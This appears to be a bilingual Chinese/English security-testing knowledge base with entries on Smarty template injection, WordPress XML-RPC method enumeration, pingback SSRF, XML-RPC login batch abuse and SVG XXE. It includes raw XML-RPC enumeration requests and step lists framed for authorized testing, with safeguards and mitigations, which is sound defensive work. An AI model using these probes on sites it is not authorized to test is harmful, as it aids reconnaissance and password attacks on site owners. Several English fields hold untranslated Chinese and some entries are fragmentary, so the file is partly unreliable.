vulnerability.zh: 根因是应用允许不可信内容控制 Smarty 语法，同时未启用或错误配置安全策略，使模板能够调用危险函数、读取资源或访问过宽对象。某个旧语法被解析报错并不等于可执行；禁用标签、未知函数和模板缓存也会改变结果。
vulnerability.en: The root cause is allowing untrusted content to control Smarty syntax without a correctly configured security policy, exposing dangerous functions, resources, or objects. A parse error for historical syntax is not execution; disabled tags, unknown functions, and template caching alter the outcome.

exploitation.zh: 1. 获取 Smarty 版本和 SecurityPolicy 配置并建立普通插值基线；2. 使用无副作用表达式确认模板编译，再逐项观察 PHP 标签、函数调用和资源访问是允许还是拒绝；3. 在隔离环境运行现有样例并启用/禁用策略对照。观察证据是稳定的服务端模板结果或明确策略拒绝；缓存旧页面、PHP 错误页及字符串原样输出属于假阳性。
exploitation.en: 1. 获取 Smarty 版本和 Security Policy 配置并建立普通插值基线；2. 使用无副作用表达式确认模板编译，再逐项观察 PHP 标签、函数调用和资源访问是允许还是拒绝；3. 在隔离环境运行现有样例并启用/禁用策略对照。观察证据是稳定的服务端模板结果或明确策略拒绝；缓存旧页面、PHP 错误页及字符串原样输出属于假阳性。

mitigation.zh: 1. 固定模板文件并只通过变量传值，禁止用户编辑原始 Smarty 源码；2. 启用最严格 SecurityPolicy，限制函数、修饰器、资源和对象访问；3. 升级 Smarty 并删除遗留 `{php}` 支持及危险插件；4. 分离模板缓存、记录编译错误，并为被禁止语法建立负向回归测试。
mitigation.en: 1. Use fixed templates and pass values only through variables; do not let users edit raw Smarty source. 2. Enable the strictest Security Policy and restrict functions, modifiers, resources, and object access. 3. Upgrade Smarty and remove legacy `{php}` support and dangerous plugins. 4. Isolate template caches, log compilation errors, and add negative tests for forbidden syntax.

name.zh: WordPress XML-RPC 方法暴露枚举
name.en: Word Press XML-RPC Method Exposure Enumeration

description.zh: 用于确认 XML-RPC 端点是否启用、公开哪些方法以及方法调用是否受到认证和最小化配置约束。
description.en: 用于确认 XML-RPC 端点是否启用、公开哪些方法以及方法调用是否受到认证和最小化配置约束。

prerequisites.zh: 目标 WordPress XML-RPC endpoint 已确认启用，测试来源获授权，并能区分 system.* introspection 与业务方法。
prerequisites.en: The target Word Press XML-RPC endpoint is confirmed enabled and authorized for testing, with system introspection methods distinguished from business methods.

prerequisites.zh: 使用单次低速请求和最低权限测试账户，保存 methodResponse/faultCode、插件配置、认证状态和服务器方法调用审计。
prerequisites.en: 使用单次低速请求和最低权限测试账户，保存 method Response/fault Code、插件配置、认证状态和服务器方法调用审计。

title.zh: XML-RPC方法枚举
title.en: Validation step 1 for Word Press XML-RPC Method Exposure Enumeration

execution.command:
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>system.methodHelp</methodName><params><param><value><string>system.listMethods</string></value></param></params></methodCall>
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>system.methodSignature</methodName><params><param><value><string>system.listMethods</string></value></param></params></methodCall>
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>system.listMethods</string></value></member><member><name>params</name><value><array><data></data></array></value></member></struct></value></data></array></value></param></params></methodCall>
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>system.getCapabilities</methodName><params></params></methodCall>
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>system.listMethods</methodName></methodCall>
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>system.methodHelp</methodName></methodCall>
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>system.methodSignature</methodName></methodCall>
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>system.multicall</methodName></methodCall>
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>system.getCapabilities</methodName></methodCall>

description.zh: XML-RPC方法枚举包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Word Press XML-RPC Method Exposure Enumeration validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据首先是 system.listMethods 等由目标 endpoint 实际响应；风险结论还需证明公开了非预期方法或未授权测试方法可调用，不能只凭端点存在。 假阳性边界：xmlrpc.php 返回 200/405、WordPress 指纹、通用 XML fault、方法列表只含预期公开项、WAF 模拟响应或 endpoint 强制认证都不是漏洞。
analysis.en: Positive evidence first requires the target endpoint to actually answer system.list Methods or related calls; a risk finding additionally needs unexpected method exposure or unauthorized invocation of a test method, not endpoint existence alone. False-positive boundary: An HTTP 200 or 405 from xmlrpc.php, Word Press fingerprinting, a generic XML fault, an expected public-only method list, a WAF-generated response, or enforced authentication does not prove a vulnerability.

opsecTips.zh: XML-RPC 枚举只调用少量 system.* 方法，不执行 multicall 放大或业务写方法；出现速率限制、真实内容变化、登录尝试或服务延迟时停止。
opsecTips.en: XML-RPC enumeration calls a small set of system methods only and never amplification multicalls or business writes; stop on rate limiting, real content changes, login attempts, or service latency.

opsecTips.zh: 关闭测试会话，删除 method 审计和临时响应，恢复 XML-RPC/插件最小化配置并重放允许与禁止方法基线。
opsecTips.en: Close test sessions, delete method audit and temporary responses, restore minimized XML-RPC and plugin configuration, and replay allowed and denied method baselines.

title.zh: 确认 XML-RPC 协议响应

description.zh: 记录正确和错误 XML 请求的 Content-Type、faultCode 和响应结构，排除普通 HTML 页面。
description.en: Record Content-Type, fault Code, and response structure for valid and malformed XML requests to exclude ordinary HTML pages.

title.zh: 枚举并分类公开方法

description.zh: 运行现有 XML-RPC 方法集合，将结果按公开、需认证、禁用和未知方法分类。
description.en: Run the existing XML-RPC method set and classify results as public, authenticated, disabled, or unknown.

title.zh: 验证一个只读认证边界

description.zh: 对一个无状态只读方法比较匿名和授权测试账号响应，不执行内容修改或批量操作。
description.en: Compare anonymous and authorized test-account responses for one stateless read-only method without modifying content or running bulk operations.

title.zh: 最小化方法面并复测
title.en: Minimize the method surface and retest

description.zh: 关闭不需要的方法、设置调用限制后重新枚举，确认仅保留批准的业务能力。
description.en: Disable unnecessary methods, set call limits, and enumerate again to confirm that only approved business capabilities remain.

overview.zh: 该条用于识别 WordPress 或兼容服务的 XML-RPC 端点及方法清单。方法存在本身是协议功能，不应直接标记为漏洞；质量判断要结合是否业务需要、是否需要认证、是否暴露高风险方法以及网关和应用的调用限制。
overview.en: This entry identifies an XML-RPC endpoint and its exposed methods on Word Press or compatible services. Method availability is a protocol feature, not automatically a vulnerability. Assessment must consider business need, authentication, high-risk methods, and gateway and application limits.

vulnerability.zh: 风险来自不必要的方法暴露、鉴权边界不一致或服务将公开方法与敏感操作绑定。`system.listMethods` 成功只说明可枚举能力，不证明未授权操作；反向代理伪造的 XML 响应、缓存或 WAF 模板也可能造成错误识别。
vulnerability.en: Risk comes from unnecessary method exposure, inconsistent authentication boundaries, or public methods connected to sensitive operations. A successful system.list Methods call proves enumeration only, not unauthorized action. Proxy-generated XML, cache, or WAF templates can also cause misidentification.

exploitation.zh: 1. 记录端点基线、响应 Content-Type 和 XML-RPC faultCode；2. 提交现有方法枚举请求并对返回方法按公开、需认证和禁用分类；3. 选取一个只读方法验证认证边界并检查服务日志。观察证据是结构有效且与应用版本一致的方法响应；HTML 错误页、WAF XML 模板和缓存内容属于假阳性。
exploitation.en: 1. Record the endpoint baseline, response Content-Type, and XML-RPC fault Code. 2. Submit the existing method-enumeration request and classify returned methods as public, authenticated, or disabled. 3. Use one read-only method to verify the authentication boundary and inspect service logs. A structurally valid method response consistent with the application version is evidence; HTML errors, WAF XML templates, and cached content are false positives.

mitigation.zh: 1. 不需要 XML-RPC 时在应用层关闭端点而不是仅隐藏路径；2. 仅保留业务必需方法并为敏感方法强制认证和授权；3. 对方法调用实施速率限制、请求大小和并发限制；4. 记录方法名、调用主体、faultCode 和异常频率并加入配置回归检查。
mitigation.en: 1. Disable XML-RPC at the application layer when it is not needed rather than merely hiding the path. 2. Keep only required methods and enforce authentication and authorization for sensitive methods. 3. Apply rate, request-size, and concurrency limits. 4. Log method names, principals, fault codes, and unusual frequency and add configuration regression checks.

name.zh: WordPress XML-RPC Pingback 回调验证
name.en: Word Press XML-RPC Pingback Callback Validation

description.zh: 验证 pingback.ping 是否会由服务器访问提交的来源 URL，并评估目标约束、重定向和出站策略。
description.en: Verifies whether pingback.ping causes the server to fetch a supplied source URL and evaluates target validation, redirects, and egress policy.

prerequisites.zh: WordPress pingback.ping 在授权站点启用，来源/目标 URL 参数语义、站点文章引用要求和出站网络路径已确认。
prerequisites.en: Word Press pingback.ping is enabled on an authorized site, with source and target URL semantics, post-link requirements, and egress path confirmed.

prerequisites.zh: evil/target 域全部替换为自有空页面和唯一令牌，来源页包含合法测试链接，并记录 XML-RPC fault、DNS/HTTP 与 WordPress 请求 ID。
prerequisites.en: All evil and target domains are replaced by owned empty pages and unique tokens, the source page contains a legitimate test link, and XML-RPC faults, DNS or HTTP, and Word Press request identifiers are recorded.

title.zh: XML-RPC pingback利用
title.en: Validation step 1 for Word Press XML-RPC Pingback Callback Validation

description.zh: XML-RPC pingback利用包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Word Press XML-RPC Pingback Callback Validation validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是 WordPress 处理特定 pingback.ping 后由应用服务器访问自有来源 URL，令牌、源 IP、User-Agent、时间和 XML-RPC 请求相互对应。 假阳性边界：测试人员浏览器/扫描器请求来源页、DNS 预解析、fault 表示方法存在、目标文章被客户端访问、反向代理探测或未关联回调均不是服务端 Pingback。
analysis.en: 阳性证据是 Word Press 处理特定 pingback.ping 后由应用服务器访问自有来源 URL，令牌、源 IP、User-Agent、时间和 XML-RPC 请求相互对应。 假阳性边界：测试人员浏览器/扫描器请求来源页、DNS 预解析、fault 表示方法存在、目标文章被客户端访问、反向代理探测或未关联回调均不是服务端 Pingback。

opsecTips.zh: Pingback 回调只访问自有空页面一次，禁止重定向、公共站点和大响应；出现重复请求、第三方 IP、真实评论/通知或出站策略异常时停止。
opsecTips.en: Pingback callback visits an owned empty page once and forbids redirects, public sites, and large responses; stop on repeated requests, third-party IPs, real comments or notifications, or egress-policy anomalies.

opsecTips.zh: 删除测试来源/目标文章和 pingback 记录，关闭监听端点，清理 DNS/HTTP/XML-RPC 日志与缓存，并恢复 Pingback 配置。
opsecTips.en: Delete test source and target posts plus pingback records, close listener endpoints, clear DNS, HTTP, XML-RPC logs and caches, and restore Pingback configuration.

title.zh: 准备唯一外部回调标记
title.en: Prepare a unique external callback marker

description.zh: 在授权服务器创建一次性路径并记录请求头、来源 IP 和时间窗，避免与其他流量混淆。
description.en: Create a one-time path on an authorized server and record headers, source IP, and time window to avoid confusion with unrelated traffic.

title.zh: 触发 pingback.ping

description.zh: 提交现有 pingback XML 请求并记录 XML-RPC faultCode、目标文章和服务端任务日志。
description.en: Submit the existing pingback XML request and record the XML-RPC fault Code, target article, and server job logs.

title.zh: 验证重定向与地址策略

description.zh: 在测试网络用单次受控重定向和不可达地址比较最终 IP 校验，禁止触碰真实内网或元数据服务。
description.en: In a test network, compare final-IP validation with one controlled redirect and an unreachable address without touching real internal or metadata services.

title.zh: 关闭或限制 Pingback 后复测
title.en: Retest after disabling or restricting pingback

description.zh: 应用功能开关、最终地址校验和出站 ACL 后重复外部样例，确认策略符合业务预期。
description.en: Apply the feature toggle, final-address validation, and egress ACLs, then repeat the external sample to confirm policy matches business requirements.

overview.zh: WordPress pingback 的合法用途是让站点验证其他页面对本文章的链接，因此服务端会读取来源 URL。安全评估应确认该功能是否启用、来源与目标如何校验、是否跟随重定向以及请求从何处发出；一次正常外部回调不等于可访问内网。
overview.en: Word Press pingback 的合法用途是让站点验证其他页面对本文章的链接，因此服务端会读取来源 URL。安全评估应确认该功能是否启用、来源与目标如何校验、是否跟随重定向以及请求从何处发出；一次正常外部回调不等于可访问内网。

vulnerability.zh: 根因是 pingback.ping 接受可控 URL 并由服务器发起请求，但缺少协议、最终地址、DNS 解析和网络范围限制。功能成功与 SSRF 影响需要分开：只有攻击者能让请求越过预期出站边界或访问受限目标时才构成安全问题。
vulnerability.en: The root cause is a controllable URL fetched by the server without sufficient restrictions on scheme, final address, DNS resolution, and network range. Functional success and SSRF impact are separate; the security issue requires crossing the intended egress boundary or reaching a restricted target.

exploitation.zh: 1. 在授权域准备返回唯一随机标记且不重定向的页面；2. 提交现有 pingback 请求并关联应用日志、来源 IP 和目标文章；3. 在测试网络增加一次受控重定向和一个不可达地址，比较校验阶段。观察证据是服务器按预期任务发出可关联请求；浏览器访问、搜索爬虫或其他后台任务的请求属于假阳性。
exploitation.en: 1. Prepare an authorized page that returns a unique random marker without redirecting. 2. Submit the existing pingback request and correlate application logs, source IP, and target article. 3. In a test network, add one controlled redirect and one unreachable address to compare validation stages. Evidence is a correlatable server request from the pingback task; browser visits, search crawlers, and unrelated jobs are false positives.

mitigation.zh: 1. 不需要 pingback 时在 WordPress 配置中关闭；2. 必须保留时只允许 HTTP/HTTPS，并在 DNS 解析后及每次重定向后阻止本地、私网、链路本地和保留地址；3. 使用出站代理和网络 ACL 限制目标端口与网段；4. 记录来源 URL、最终 IP、重定向链和调用主体并限制频率。
mitigation.en: 1. Disable pingback in Word Press when it is unnecessary. 2. If retained, allow only HTTP and HTTPS and block loopback, private, link-local, and reserved ranges after DNS resolution and every redirect. 3. Use an egress proxy and network AC Ls to restrict destination ports and ranges. 4. Log source URL, final IP, redirect chain, and principal and enforce rate limits.

name.zh: WordPress XML-RPC 认证重试与批量滥用
name.en: Word Press XML-RPC Authentication Retry and Batch Abuse

description.zh: 验证 XML-RPC 登录方法是否绕过统一登录锁定、速率限制或通过批量调用放大认证尝试。
description.en: Verifies whether XML-RPC login methods bypass centralized lockout and rate limits or amplify authentication attempts through batching.

prerequisites.zh: WordPress XML-RPC 登录方法在授权测试实例可用，统一登录锁定/速率限制、应用密码和 system.multicall 行为已记录。
prerequisites.en: Word Press XML-RPC login methods are available on an authorized test instance, with unified login lockout or rate limiting, application passwords, and system.multicall behavior recorded.

prerequisites.zh: 只使用专用测试账户与少量明确错误密码，监控 XML-RPC、wp-login、WAF 和账户锁定计数，不使用默认/真实凭据字典。
prerequisites.en: A dedicated test account and a few explicit wrong passwords are used while XML-RPC, wp-login, WAF, and lockout counters are monitored, without default or real credential dictionaries.

description.zh: XML-RPC暴力破解包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Word Press XML-RPC Authentication Retry and Batch Abuse validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是相同测试账户的 XML-RPC 失败尝试未计入统一限制，或单个 multicall 实际执行多次认证并超过预期阈值，服务端审计可计数。 假阳性边界：不同错误消息、XML-RPC 返回 fault、单次登录方法可用、WAF 允许请求、测试账户未锁但尚未达到阈值或客户端发送多请求均不是放大/绕过。
analysis.en: Positive evidence requires failed XML-RPC attempts for the same test account to evade unified controls, or one multicall to execute multiple authentications beyond the intended threshold, countable in server audit. False-positive boundary: Different error text, an XML-RPC fault, availability of one login method, WAF allowance, no lockout before the threshold, or multiple client requests does not prove amplification or bypass.

opsecTips.zh: 认证重试测试严格限制次数并只用测试账户；出现真实账户、成功登录、锁定、通知邮件、自动封禁、服务压力或并发放大时停止。
opsecTips.en: Authentication-retry testing strictly limits attempts and uses a test account only; stop on real accounts, successful login, lockout, notification email, automatic blocking, service pressure, or concurrent amplification.

opsecTips.zh: 重置/删除测试账户与锁定计数，吊销测试会话/应用密码，清理 XML-RPC/WAF 日志和队列邮件，恢复速率限制配置。
opsecTips.en: Reset or delete the test account and lockout counters, revoke test sessions and application passwords, clear XML-RPC and WAF logs plus queued mail, and restore rate-limit configuration.

title.zh: 建立网页登录限制基线

description.zh: 使用专用账号记录网页端失败计数、锁定、冷却和响应头，固定测试次数上限。
description.en: Use a dedicated account to record web failure counters, lockout, cooldown, and response headers and fix a maximum test-attempt count.

title.zh: 执行受限 XML-RPC 对照

description.zh: 在批准次数内提交现有 XML-RPC 认证请求，逐次记录 faultCode、耗时、账号状态和限速信号。
description.en: Within the approved attempt count, submit the existing XML-RPC authentication request and record fault Code, timing, account state, and rate-limit signals for each attempt.

title.zh: 检查批量调用计数

description.zh: 仅在测试环境以小批量确认 multicall 是否按子调用累计失败次数，并与单请求结果比较。
description.en: Only in a test environment, use a small batch to confirm whether multicall counts every subcall and compare it with single-call behavior.

title.zh: 统一风控后回归

description.zh: 将 XML-RPC 纳入统一限速与锁定后重复同样少量尝试，确认各通道阈值一致且正常客户端可用。
description.en: After integrating XML-RPC with centralized limits and lockout, repeat the same small test to confirm consistent thresholds and normal client operation.

overview.zh: 该条关注 XML-RPC 登录方法是否与网页登录共享失败计数、账号锁定、验证码和速率限制。它不是密码字典本身的质量展示；应使用专用测试账号和极低次数验证控制一致性，避免对真实账号进行批量尝试。
overview.en: This entry evaluates whether XML-RPC login methods share failure counters, lockout, CAPTCHA, and rate limits with web login. It is not a password-list showcase. Use a dedicated test account and very few attempts to verify control consistency without bulk attempts against real accounts.

vulnerability.zh: 根因通常是 XML-RPC 认证走独立代码路径，未接入统一风控，或 multicall 把多次认证封装进单个 HTTP 请求而计数器只按请求计数。单个错误密码返回标准 faultCode 属于正常功能，只有限制明显不一致或批量放大成功才构成问题。
vulnerability.en: The root cause is usually an XML-RPC authentication path outside centralized risk controls, or multicall packaging many attempts into one HTTP request while counters track requests only. A standard fault Code for one wrong password is normal; the issue requires inconsistent limits or successful amplification.

exploitation.zh: 1. 为专用测试账号记录网页登录的失败阈值和冷却时间；2. 以现有 XML-RPC 请求进行不超过批准次数的错误认证并记录 faultCode、Retry-After 和账号状态；3. 在测试环境检查 multicall 是否按内部调用计数。观察证据是 XML-RPC 可继续尝试而网页已限速，或批量调用未逐项计数；普通失败响应和不同错误文案属于假阳性。
exploitation.en: 1. Record the web-login failure threshold and cooldown for a dedicated test account. 2. Use the existing XML-RPC request for no more than the approved number of failed authentications and record fault Code, Retry-After, and account state. 3. In a test environment, check whether multicall counts each internal call. Evidence is continued XML-RPC attempts after web login is limited or missing per-call counting; normal failures and different wording are false positives.

mitigation.zh: 1. 将网页、API 和 XML-RPC 接入统一账号级与来源级速率限制；2. 对 multicall 按内部调用计数并设置最大子调用数；3. 为高风险登录启用 MFA、强密码和渐进延迟，避免仅依赖 IP；4. 记录方法名、账号、失败原因和批量大小并对跨通道异常建立告警。
mitigation.en: 1. Apply centralized account- and source-level rate limits across web, API, and XML-RPC. 2. Count each multicall subrequest and cap batch size. 3. Use MFA, strong passwords, and progressive delay for high-risk login rather than relying on IP alone. 4. Log method, account, failure reason, and batch size and alert on cross-channel anomalies.

description.zh: SVG XXE包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: SVG XXE contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 阳性证据按变体区分：xlink 需 worker 实际读取/嵌入 marker 资源，DTD 需实体值进入解析结果；文件审计或自有请求必须关联任务。 假阳性边界：浏览器加载 SVG 外链、URI 字符串出现在 XML、渲染器画出破图标、文件不存在错误、只发生 DNS 或 parser 禁止 DTD 均不能统称 XXE。
analysis.en: Positive evidence is variant-specific: xlink requires the worker to read or embed the marker resource, while DTD requires the entity value to enter the parse result; file audit or owned requests must correlate with the job. False-positive boundary: Browser-side external loading, a URI string in XML, a broken-image render, file-not-found errors, DNS alone, or DTD-disabled parsing cannot all be labeled XXE.

opsecTips.zh: SVG XML 综合测试每轮只验证一种加载机制，禁止系统文件和公共 URL；出现真实文件、跨网段请求、递归资源、内存增长或 worker 崩溃时停止。
opsecTips.en: Comprehensive SVG XML testing validates one load mechanism per run and forbids system files and public URLs; stop on real files, cross-segment requests, recursive resources, memory growth, or worker crashes.

opsecTips.zh: 删除 SVG、marker 资源和渲染产物，关闭自有端点，清理图像/转换缓存与任务日志，并重启隔离 renderer。
opsecTips.en: Delete SVGs, marker resources, and render artifacts, close owned endpoints, clear image and conversion caches plus job logs, and restart isolated renderers.
